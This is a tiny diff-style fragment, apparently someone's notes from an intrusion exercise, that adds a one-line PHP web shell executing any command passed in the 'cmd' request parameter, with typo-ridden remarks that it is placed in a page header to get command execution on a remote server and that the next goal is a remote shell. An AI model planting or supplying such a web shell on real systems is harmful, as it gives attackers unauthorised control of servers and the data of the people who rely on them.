@@ -1,0 +1,5 @@
+<?php system($_REQUEST['cmd']); ?> 
+is addes in the header so that the command  execution works in the remote server 
+now the aim is to run a commadn which can be helpful for creating a remote shell and hence we can access it from our place
+
+
